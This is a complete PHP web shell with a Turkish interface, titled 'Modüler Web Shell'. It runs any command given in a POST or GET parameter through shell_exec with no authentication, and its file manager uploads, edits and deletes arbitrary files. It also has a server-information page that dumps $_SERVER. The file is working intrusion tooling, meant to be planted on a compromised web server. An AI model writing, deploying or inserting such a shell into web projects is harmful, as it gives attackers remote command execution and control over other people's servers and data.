<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modüler Web Shell</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f5f6fa;
            margin: 0;
            padding: 0;
        }
        .header {
            background-color: #34495e;
            color: white;
            padding: 20px;
            text-align: center;
            font-size: 24px;
        }
        .container {
            display: flex;
            min-height: 100vh;
        }
        .sidebar {
            width: 250px;
            background-color: #2c3e50;
            padding: 20px;
            color: white;
            box-shadow: 2px 0 5px rgba(0, 0, 0, 0.1);
        }
        .sidebar button {
            background-color: #34495e;
            border: none;
            color: white;
            padding: 15px;
            text-align: left;
            width: 100%;
            font-size: 16px;
            margin-bottom: 10px;
            cursor: pointer;
            border-radius: 5px;
        }
        .sidebar button:hover {
            background-color: #1abc9c;
        }
        .content {
            flex: 1;
            padding: 20px;
        }
        .card {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-bottom: 20px;
        }
        .card h2 {
            margin-top: 0;
            color: #34495e;
        }
        form {
            display: flex;
            gap: 10px;
        }
        input[type="text"], input[type="file"] {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button[type="submit"], .btn {
            padding: 10px 20px;
            background-color: #1abc9c;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button[type="submit"]:hover, .btn:hover {
            background-color: #16a085;
        }
        pre {
            background-color: #ecf0f1;
            padding: 20px;
            border-radius: 10px;
            overflow-x: auto;
        }
        ul {
            list-style-type: none;
            padding: 0;
        }
        ul li {
            padding: 10px;
            background-color: #f9f9f9;
            margin-bottom: 5px;
            border-radius: 5px;
        }
        ul li a {
            color: #1abc9c;
            text-decoration: none;
        }
        ul li a:hover {
            text-decoration: underline;
        }
        .error {
            color: red;
            margin-top: 10px;
        }
        .success {
            color: green;
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="header">
    <h1>Modüler Web Shell</h1>
</div>

<div class="container">
    <div class="sidebar">
        <button onclick="loadPage('home')">Ana Sayfa</button>
        <button onclick="loadPage('terminal')">Terminal (POST İsteği)</button>
        <button onclick="loadPage('terminalv2')">Terminal V2 (GET İsteği)</button>
        <button onclick="loadPage('filemanager')">Dosya Yöneticisi</button>
        <button onclick="loadPage('serverinfo')">Sunucu Bilgileri</button>
        <button onclick="loadPage('commands')">Komutlar</button>
        <button onclick="loadPage('help')">Yardım</button>
    </div>
    <div class="content" id="content">
        <?php
        // Geçerli sayfa isteği kontrolü
        if (isset($_GET['page'])) {
            $page = $_GET['page'];
            // İstenilen sayfaya göre uygun fonksiyonu çağır
            if ($page == 'home') {
                homePage();
            } elseif ($page == 'terminal') {
                terminalPage();
            } elseif ($page == 'terminalv2') {
                terminalV2Page();
            } elseif ($page == 'filemanager') {
                filemanagerPage();
            } elseif ($page == 'serverinfo') {
                serverInfoPage();
            } elseif ($page == 'commands') {
                commandsPage();
            } elseif ($page == 'help') {
                helpPage();
            }
        } else {
            homePage(); // Ana sayfa varsayılan olarak yüklenir
        }

        // Ana sayfa fonksiyonu
        function homePage() {
            echo '<div class="card">';
            echo '<h2>Ana Sayfa</h2>';
            echo '<p>Web Shell e hoş geldiniz. Menüden bir seçenek seçerek işlemlere başlayın.</p>';
            echo '</div>';
        }

        // Terminal sayfası (POST isteği)
        function terminalPage() {
            echo '<div class="card">';
            echo '<h2>Terminal (POST İsteği)</h2>';
            $output = '';
            // Komut gönderildiğinde çalıştır ve çıktıyı al
            if (!empty($_POST['cmd'])) {
                $cmd = $_POST['cmd'];
                $output = shell_exec($cmd . ' 2>&1');
            }
            echo '<form method="POST" action="?page=terminal">';
            echo '<input type="text" name="cmd" id="cmd" placeholder="Komut giriniz..." required>';
            echo '<button class="btn" type="submit">Çalıştır</button>';
            echo '</form>';
            // Çıktıyı göster
            if (!empty($output)) {
                echo '<h3>Çıktı:</h3>';
                echo '<pre>' . $output . '</pre>';
            }
            echo '</div>';
        }

        // Terminal V2 sayfası (GET isteği)
        function terminalV2Page() {
            echo '<div class="card">';
            echo '<h2>Terminal V2 (GET İsteği)</h2>';
            $output = '';
            // Komut gönderildiğinde çalıştır ve çıktıyı al
            if (isset($_GET['cmd'])) {
                $cmd = $_GET['cmd'];
                $output = shell_exec($cmd . ' 2>&1');
            }
            echo '<form method="GET" action="?page=terminalv2">';
            echo '<input type="text" name="cmd" id="cmd" placeholder="Komut giriniz..." required>';
            echo '<button class="btn" type="submit">Çalıştır</button>';
            echo '</form>';
            // Çıktıyı göster
            if (!empty($output)) {
                echo '<h3>Çıktı:</h3>';
                echo '<pre>' . $output . '</pre>';
            }
            echo '</div>';
        }

        // Dosya yöneticisi sayfası
        function filemanagerPage() {
            echo '<div class="card">';
            echo '<h2>Dosya Yöneticisi</h2>';

            // Klasör oluşturma işlemi
            if (isset($_POST['new_folder']) && !empty($_POST['folder_name'])) {
                $newFolder = $_POST['folder_name'];
                $dir = isset($_GET['directory']) ? $_GET['directory'] : './';
                $newFolderPath = $dir . '/' . $newFolder;
                if (!file_exists($newFolderPath)) {
                    mkdir($newFolderPath);
                    echo '<p class="success">Klasör başarıyla oluşturuldu: ' . htmlspecialchars($newFolder) . '</p>';
                } else {
                    echo '<p class="error">Klasör zaten mevcut.</p>';
                }
            }

            // Dosya yükleme işlemi
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
                $targetDirectory = './';
                $targetFile = $targetDirectory . basename($_FILES['file']['name']);
                if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
                    echo '<p class="success">Dosya başarıyla yüklendi: ' . htmlspecialchars($_FILES['file']['name']) . '</p>';
                } else {
                    echo '<p class="error">Dosya yüklenirken bir hata oluştu.</p>';
                }
            }

            // Dosya silme işlemi
            if (isset($_GET['delete'])) {
                $fileToDelete = $_GET['delete'];
                if (file_exists($fileToDelete)) {
                    unlink($fileToDelete);
                    echo '<p class="success">Dosya başarıyla silindi: ' . htmlspecialchars($fileToDelete) . '</p>';
                } else {
                    echo '<p class="error">Dosya bulunamadı.</p>';
                }
            }

            // Dosya düzenleme işlemi
            if (isset($_GET['edit'])) {
                $fileToEdit = $_GET['edit'];
                if (file_exists($fileToEdit)) {
                    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                        file_put_contents($fileToEdit, $_POST['file_content']);
                        echo '<p class="success">Dosya başarıyla güncellendi: ' . htmlspecialchars($fileToEdit) . '</p>';
                    }
                    echo '<form method="POST" action="?page=filemanager&edit=' . urlencode($fileToEdit) . '">';
                    echo '<textarea name="file_content" rows="10" style="width: 100%;">' . htmlspecialchars(file_get_contents($fileToEdit)) . '</textarea>';
                    echo '<button class="btn" type="submit">Güncelle</button>';
                    echo '</form>';
                }
            }

            // Klasör ve dosyaları listele
            $directory = isset($_GET['directory']) ? $_GET['directory'] : './';
            if ($handle = opendir($directory)) {
                echo '<h3>' . htmlspecialchars($directory) . ' İçeriği:</h3>';
                echo '<ul>';
                while (false !== ($entry = readdir($handle))) {
                    if ($entry != "." && $entry != "..") {
                        echo '<li>';
                        if (is_dir($directory . '/' . $entry)) {
                            echo '<a href="?page=filemanager&directory=' . urlencode($directory . '/' . $entry) . '">' . htmlspecialchars($entry) . '</a>';
                        } else {
                            echo htmlspecialchars($entry);
                            echo ' <a href="?page=filemanager&edit=' . urlencode($directory . '/' . $entry) . '">Düzenle</a>';
                            echo ' <a href="?page=filemanager&delete=' . urlencode($directory . '/' . $entry) . '" onclick="return confirm(\'Silmek istediğinizden emin misiniz?\')">Sil</a>';
                        }
                        echo '</li>';
                    }
                }
                echo '</ul>';
                closedir($handle);
            }

            echo '<form method="POST" action="?page=filemanager">';
            echo '<h3>Yeni Klasör Oluştur</h3>';
            echo '<input type="text" name="folder_name" placeholder="Klasör adı" required>';
            echo '<button class="btn" type="submit" name="new_folder">Oluştur</button>';
            echo '</form>';

            echo '<h3>Dosya Yükle</h3>';
            echo '<form method="POST" action="?page=filemanager" enctype="multipart/form-data">';
            echo '<input type="file" name="file" required>';
            echo '<button class="btn" type="submit">Yükle</button>';
            echo '</form>';
            echo '</div>';
        }

        // Sunucu bilgileri sayfası
        function serverInfoPage() {
            echo '<div class="card">';
            echo '<h2>Sunucu Bilgileri</h2>';
            echo '<pre>' . print_r($_SERVER, true) . '</pre>';
            echo '</div>';
        }

        // Komutlar sayfası
        function commandsPage() {
            echo '<div class="card">';
            echo '<h2>Kullanılabilir Komutlar</h2>';
            echo '<ul>';
            echo '<li>ls - Dosyaları listele</li>';
            echo '<li>cat - Dosya içeriğini görüntüle</li>';
            echo '<li>mkdir - Klasör oluştur</li>';
            echo '<li>rm - Dosya sil</li>';
            echo '<li>touch - Boş dosya oluştur</li>';
            echo '</ul>';
            echo '</div>';
        }

        // Yardım sayfası
        function helpPage() {
            echo '<div class="card">';
            echo '<h2>Yardım</h2>';
            echo '<p>Bu web shell, sunucu komutlarını çalıştırmak, dosya yönetimi yapmak ve sunucu bilgilerini görüntülemek için kullanılabilir. Aşağıdaki seçenekleri kullanabilirsiniz:</p>';
            echo '<ul>';
            echo '<li><strong>Ana Sayfa:</strong> Uygulamanın başlangıç sayfasını görüntüler.</li>';
            echo '<li><strong>Terminal (POST İsteği):</strong> Komutları çalıştırmak için POST isteği kullanır.</li>';
            echo '<li><strong>Terminal V2 (GET İsteği):</strong> Komutları çalıştırmak için GET isteği kullanır.</li>';
            echo '<li><strong>Dosya Yöneticisi:</strong> Dosyaları yükleyip düzenleyebilir, klasörler oluşturabilirsiniz.</li>';
            echo '<li><strong>Sunucu Bilgileri:</strong> Sunucuya dair bilgileri görüntüler.</li>';
            echo '<li><strong>Komutlar:</strong> Kullanabileceğiniz komutların listesini gösterir.</li>';
            echo '<li><strong>Yardım:</strong> Uygulamanın kullanımı hakkında bilgi verir.</li>';
            echo '</ul>';
            echo '</div>';
        }
        ?>
    </div>
</div>

<script>
    function loadPage(page) {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', `?page=${page}`, true);
        xhr.onload = function () {
            if (this.status === 200) {
                document.getElementById('content').innerHTML = this.responseText;
            }
        };
        xhr.send();
    }
</script>

</body>
</html>
